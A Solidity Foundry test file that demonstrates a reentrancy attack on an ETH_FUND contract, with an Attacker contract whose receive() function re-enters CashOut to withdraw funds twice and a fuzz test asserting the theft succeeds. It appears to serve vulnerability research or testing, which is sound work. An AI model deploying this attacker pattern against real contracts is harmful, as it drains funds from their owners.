
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_FUND, Log} from "../src/ETH_FUND.sol";

contract TestReentrancyETH_FUND is Test {
    ETH_FUND public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_FUND(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // 1. Constraints
        // MinDeposit is 1 ether, so attackVal must be greater than 1 ether.
        vm.assume(attackVal > 1 ether + 100 wei);
        // Cap the value to avoid overflow issues and keep it realistic.
        vm.assume(attackVal < 1000 ether);

        // 2. Funding
        // Fund the victim contract so there is ETH to steal.
        vm.deal(address(_contractUnderTest), attackVal * 10);
        
        // Fund the test contract to pass ETH to the attacker during setup.
        vm.deal(address(this), attackVal * 2);

        // 3. Setup Attack
        // The attacker deposits funds to pass the initial balance check.
        _attacker.setupAttack{value: attackVal}(attackVal);

        // 4. State Configuration
        // CashOut requires block.number > lastBlock.
        vm.roll(block.number + 10);

        // 5. Trigger Attack
        _attacker.attack(attackVal);

        // 6. Verify Success
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    ETH_FUND public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = ETH_FUND(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit funds to establish a balance in the victim contract
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        
        // Call the vulnerable function
        victim.CashOut(val);

        // Verify Success Conditions
        // If we successfully re-entered and withdrew funds twice, our balance increase
        // should be greater than a single withdrawal amount (val).
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the contract
            victim.CashOut(storedVal);
        }
    }

    fallback() external payable {}
}
